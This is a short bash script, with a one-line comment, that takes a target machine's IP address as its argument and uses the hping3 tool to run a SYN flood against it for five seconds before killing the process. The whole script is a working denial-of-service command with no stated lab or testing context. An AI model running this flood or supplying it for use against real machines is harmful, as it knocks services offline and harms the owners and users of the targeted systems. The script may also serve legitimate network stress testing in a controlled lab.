
#This script takes command line argument: IP address of the target machine and generate a SYN attack on it using hping3 tool.


#!/bin/bash
hping3 -S --flood $1 &		# generating SYN attack
sleep 5
kill $!
sleep 3

